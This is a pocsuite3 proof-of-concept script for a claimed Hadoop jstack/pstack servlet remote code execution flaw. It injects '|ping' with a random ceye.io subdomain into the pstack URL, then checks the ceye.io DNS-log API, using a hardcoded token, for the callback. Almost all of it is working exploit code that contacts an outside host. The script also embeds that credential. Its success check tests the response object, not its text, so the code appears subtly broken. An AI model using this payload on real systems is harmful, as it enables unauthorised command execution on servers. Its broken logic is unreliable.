#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
from pocsuite3.api import OptString


class Hadoop(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-14'
    updateDate = '2019-11-14'
    references = ['']
    name = 'Hadoop jstack pstack Servlet Remote Code Execution'
    appPowerLink = ''
    appName = 'Hadoop'
    appVersion = 'hadoop, hbase, hdfs 0.2'
    vulType = 'rce'
    desc = ''' 
    Hadoop jstack pstack Servlet Remote Code Execution
    '''

    def _verify(self):
        result = {}
        payload = random_str(16) + '.6eb4yw.ceye.io'
        cmd = '|ping ' + payload
        path = 'pstack?pid=123'
        path2 = 'jstack?pid=123'
        try:
            if self.url[-1] == '/':
                url = self.url + path + cmd
            else:
                url = self.url + '/' + path + cmd
            attack = requests.get(url)
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if payload in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output

register_poc(Hadoop)